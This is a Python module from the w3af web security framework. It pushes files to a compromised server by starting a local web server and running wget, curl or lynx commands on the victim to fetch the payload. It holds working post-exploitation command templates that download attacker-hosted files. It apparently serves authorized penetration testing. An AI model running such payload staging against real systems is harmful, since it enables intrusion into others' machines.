'''
clientlessReverseHTTP.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.controllers.outputManager as om
from core.controllers.w3afException import *
from core.data.fuzzer.fuzzer import *
from core.controllers.payloadTransfer.basePayloadTransfer import basePayloadTransfer as basePayloadTransfer

import core.controllers.daemons.webserver as webserver
from core.controllers.misc.temp_dir import get_temp_dir
from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile

import time
import os


class clientlessReverseHTTP( basePayloadTransfer ):
    '''
    This is a class that defines how to send a file to a remote server using a locally hosted webserver,
    the remote end uses "wget" or some other command like that to fetch the file. Supported commands:
        - wget
        - curl
        - lynx
    '''

    def __init__( self , exec_method, os, inboundPort ):
        self._exec_method = exec_method
        self._os = os
        self._inboundPort = inboundPort
        
        self._command = None
        
    def canTransfer( self ):
        '''
        This method is used to test if the transfer method works as expected. The implementation of
        this should transfer 10 bytes and check if they arrived as expected to the other end.
        '''
        #    Here i test what remote command we can use to fetch the payload
        for fetcher in ['wget', 'curl', 'lynx']:
            res = self._exec_method('which ' + fetcher)
            if res.startswith('/'):
                #    Almost there...
                self._command = fetcher
                
                #    Lets really test if the transfer method works.
                return self.transfer('test_string\n', getRemoteTempFile(self._exec_method) )
                
        
        return False
    
    def estimateTransferTime( self, size ):
        '''
        @return: An estimated transfer time for a file with the specified size.
        '''
        return int( size / 2000 )
        
    def transfer( self, strObject, destination ):
        '''
        This method is used to transfer the strObject from w3af to the compromised server.
        '''
        if not self._command:
            self.canTransfer()
        
        commandTemplates = {}
        commandTemplates['wget'] = 'wget http://%s:%s/%s -O %s'
        commandTemplates['lynx'] = 'lynx -source http://%s:%s/%s > %s'
        commandTemplates['curl'] = 'curl http://%s:%s/%s > %s'
        
        # Create the file
        filename = createRandAlpha( 10 )
        filePath = get_temp_dir() + os.path.sep + filename
        f = file( filePath, 'w' )
        f.write( strObject )
        f.close()
        
        # Start a web server on the inbound port and create the file that 
        # will be fetched by the compromised host
        webserver.start_webserver(cf.cf.getData('localAddress'),
                                  self._inboundPort,
                                  get_temp_dir() + os.path.sep)
        
        commandToRun = commandTemplates[self._command] % \
                            (cf.cf.getData('localAddress'), self._inboundPort,
                             filename, destination)
        self._exec_method(commandToRun)

        os.remove(filePath)
        
        return self.verify_upload( strObject, destination )
        
    def getSpeed( self ):
        '''
        @return: The transfer speed of the transfer object. It should return a number between 100 (fast) and 1 (slow)
        '''
        return 100
        
